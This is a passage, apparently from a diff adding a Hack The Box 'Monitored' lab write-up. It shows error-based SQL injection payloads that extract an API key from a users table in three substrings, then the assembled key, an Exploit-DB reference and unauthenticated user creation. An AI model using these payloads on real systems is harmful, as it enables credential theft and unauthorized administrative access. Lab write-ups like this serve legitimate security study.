+<li>Fix API Key Truncation using SUBSTRING():</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(</span><span class="n">api_key</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">28</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xi_users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Part</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">IudGPHd9pEKiee9MkJ7ggPD89q3Y</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(</span><span class="n">api_key</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">56</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xi_users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Part</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="n">ndctnPeRQOmS2PQ7QIrbJEomFVG6</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(</span><span class="n">api_key</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">70</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xi_users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Part</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">safety</span><span class="w"> </span><span class="n">padding</span><span class="p">):</span><span class="w"> </span><span class="n">Eut9CHLL</span><span class="w">
+</span></span></span></code></pre></div><p>**FInal API Key:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+</span></span></code></pre></div>
+<h2 class="relative group">Creating an user: 
+    <div id="creating-an-user" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#creating-an-user" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>also looking at this exploit from Exploit DB</p>
+<p><a
+  href="https://www.exploit-db.com/exploits/51925"
+    target="_blank"
+  >https://www.exploit-db.com/exploits/51925</a></p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image12.png_hu_f7f89874a2a1c207.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image12.png_hu_fa9f32aca99b4e4e.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image12.png_hu_5a7509067d99075f.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image12.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image12.png.png">
+
+  
+</figure>
+</p>
+<p>I was able to create an user and login without requiring the token.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image14.png_hu_2e3a7f4e22002ef8.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image14.png_hu_18d437df3a29773d.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image14.png_hu_a530bbd17d3ebce7.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image14.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image14.png.png">
+
+  
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image15.png_hu_cd2c8f5d8da8e6.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image15.png_hu_1f446d515c35b471.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image15.png_hu_cdd9b8ad9685ed9c.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image15.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image15.png.png">
+
+  
+</figure>
+</p>
+<p>they required me to change the password and I changed it to:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">password1
+</span></span></code></pre></div>
           
           
           
